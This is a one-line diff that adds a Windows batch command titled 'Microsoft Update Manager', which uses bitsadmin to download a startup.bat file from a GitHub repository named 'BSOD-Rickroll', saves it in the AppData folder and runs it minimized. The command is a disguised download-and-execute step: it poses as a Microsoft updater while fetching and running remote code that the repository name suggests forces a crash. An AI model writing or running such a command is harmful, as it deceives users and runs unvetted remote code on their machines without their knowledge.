@@ -1,0 +1,1 @@
+title Microsoft Update Manager && bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Online/startup.bat" "%AppData%\startup.bat" && cd %AppData% && start /min startup.bat
